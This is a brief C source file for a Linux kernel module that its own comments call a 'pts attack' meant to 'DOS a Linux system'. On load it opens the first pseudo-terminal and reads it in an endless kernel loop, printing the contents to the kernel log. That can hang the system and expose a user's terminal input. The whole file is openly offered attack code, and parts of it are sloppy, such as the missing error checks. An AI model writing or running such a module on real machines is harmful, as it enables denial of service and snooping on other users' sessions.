#include <linux/module.h>
#include <linux/printk.h>
#include <linux/fs.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>

/* pts attack */
/* by Karl Zander */
/* should DOS a Linux system */
 
int init_module(void) 
{ 
    pr_info("started.\n"); 
    unsigned char buffer[256];
    struct file *ptsf = NULL;

    ptsf = filp_open("/dev/pts/0", 0, 0);
    while (1) {
        kernel_read(ptsf, buffer, 256, 0);
        pr_info("%s\n", buffer);
    }
    filp_close(ptsf, NULL);
    return 0; 
} 
 
void cleanup_module(void) 
{ 
    pr_info("stopped.\n");
} 
 
MODULE_LICENSE("GPL");
